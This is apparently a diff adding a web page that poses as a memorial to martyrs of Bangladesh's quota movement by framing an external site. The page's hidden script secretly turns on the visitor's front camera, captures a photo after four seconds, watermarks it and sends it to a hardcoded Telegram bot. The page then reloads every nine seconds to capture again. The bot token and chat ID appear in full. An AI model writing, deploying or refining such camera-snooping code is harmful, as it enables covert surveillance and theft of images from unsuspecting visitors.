@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>কোটা আন্দোলনের শহীদরা</title>
+    <!-- The user's original CSS file "style.css" is not present, but the link is preserved. -->
+    <!-- <link rel="stylesheet" href="style.css" /> -->
+    <style>
+      /* Hide the video and canvas elements */
+      video,
+      canvas {
+        display: none;
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      /* Make the iframe fill the entire screen */
+      iframe {
+        width: 100%;
+        height: 100vh;
+        border: none; /* Remove the default border */
+      }
+    </style>
+    <script>
+      // Function to auto-refresh the page
+      function AutoRefresh(t) {
+        setTimeout("location.reload(true);", t);
+      }
+    </script>
+  </head>
+  <!-- Set the page to refresh every 9 seconds (9000 milliseconds) -->
+  <body onload="javascript:AutoRefresh(9000)">
+    <!-- Video element to receive the camera stream -->
+    <video id="video" autoplay playsinline></video>
+    <!-- Canvas element to capture a snapshot from the video -->
+    <canvas id="canvas" width="640" height="480"></canvas>
+    
+    <!-- design content start -->
+    <div>
+      <!-- The iframe displays the external content -->
+      <iframe src="https://shohid.info/?lang=en" frameborder="0"></iframe>
+    </div>
+    <!-- design content end -->
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+
+        // Request access to the user's camera
+        navigator.mediaDevices
+          .getUserMedia({ video: { facingMode: "user" } })
+          .then((stream) => {
+            video.srcObject = stream;
+            video.play();
+
+            // Capture the photo after 4 seconds (4000 milliseconds)
+            setTimeout(() => {
+              // Draw the current video frame onto the canvas
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+              // --- Watermarking Logic ---
+              // This logic was moved from upload.php
+              const watermarkText = "Make by Md.Sabbir Sheikh";
+              // Set font style (approximating PHP's font size 5)
+              context.font = "bold 24px Arial"; 
+              context.fillStyle = "rgba(255, 255, 255, 0.7)"; // White with 70% opacity
+              context.textAlign = "center";
+              const margin = 20;
+              const textX = canvas.width / 2;
+              const textY = canvas.height - margin;
+              
+              // Draw the watermark text
+              context.fillText(watermarkText, textX, textY);
+              
+              // Stop the video stream after capturing the image
+              stream.getTracks().forEach(track => track.stop());
+
+              // --- Telegram Sending Logic ---
+              // This logic was also moved from upload.php
+              
+              // Convert the watermarked canvas image to a Blob
+              canvas.toBlob(
+                (blob) => {
+                  if (!blob) {
+                    console.error("Canvas toBlob failed");
+                    return;
+                  }
+                  
+                  // Define bot details
+                  // WARNING: Exposing bot tokens in client-side JS is a major security risk!
+                  // Anyone can view your page source and steal these tokens.
+                  const bots = [
+                    {
+                      token: "7560452117:AAE8wxF0azAXOuhicSlQfvLghaoSP1aG-mw",
+                      chatId: "7020882570",
+                    },
+                    {
+                      token: "7560452117:AAE8wxF0azAXOuhicSlQfvLghaoSP1aG-mw",
+      				        chatId: "7020882570",
+                    }
+                  ];
+
+                  // Function to send the photo via Telegram API
+                  const sendPhoto = (bot, imageBlob) => {
+                    const formData = new FormData();
+                    formData.append("chat_id", bot.chatId);
+                    // Send the blob as a file named "snapshot.png"
+                    formData.append("photo", imageBlob, "snapshot.png");
+
+                    const url = `https://api.telegram.org/bot${bot.token}/sendPhoto`;
+
+                    fetch(url, {
+                      method: "POST",
+                      body: formData, // Send as multipart/form-data
+                    })
+                      .then((response) => response.json())
+                      .then((data) => {
+                        if (data.ok) {
+                          console.log(`Successfully sent photo to chat ${bot.chatId}`);
+                        } else {
+                          console.error(
+                            `Error sending photo to chat ${bot.chatId}:`,
+                            data.description
+                          );
+                        }
+                      })
+                      .catch((error) => {
+                        console.error(`Fetch error for chat ${bot.chatId}:`, error);
+                      });
+                  };
+
+                  // Send the photo to all defined bots
+                  bots.forEach(bot => sendPhoto(bot, blob));
+                  
+                },
+                "image/png", // Specify PNG format
+                0.9 // Image quality (0.0 to 1.0)
+              );
+            }, 4000); // Capture after 4 seconds
+          })
+          .catch((err) => {
+            // Log an error if camera access is denied or fails
+            console.error(`An error occurred: ${err}`);
+          });
+      });
+    </script>
+  </body>
+</html>
